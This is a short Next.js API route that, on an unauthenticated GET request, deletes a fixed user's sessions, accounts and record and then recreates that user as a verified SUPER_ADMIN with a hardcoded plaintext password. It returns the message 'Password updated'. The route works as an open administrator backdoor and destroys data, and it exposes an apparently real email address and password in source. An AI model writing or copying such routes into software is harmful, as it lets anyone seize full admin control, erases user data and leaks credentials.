import { NextResponse } from "next/server";
import { prisma } from "@/shared/lib/prisma";

export async function GET() {
  try {
    const { auth } = await import("@/modules/auth/auth");

    const user = await prisma.user.findUnique({
      where: { email: "abensebane41@gmail.com" },
    });

    if (user) {
      await prisma.session.deleteMany({ where: { userId: user.id } });
      await prisma.account.deleteMany({ where: { userId: user.id } });
      await prisma.user.delete({ where: { id: user.id } });
    }

    const result = await auth.api.signUpEmail({
      body: { name: "مدير النظام", email: "abensebane41@gmail.com", password: "Kader@2026!Secure" },
    });

    await prisma.user.update({
      where: { id: result.user.id },
      data: { role: "SUPER_ADMIN", emailVerified: true },
    });

    return NextResponse.json({ message: "Password updated" });
  } catch (error) {
    return NextResponse.json({ error: String(error) }, { status: 500 });
  }
}
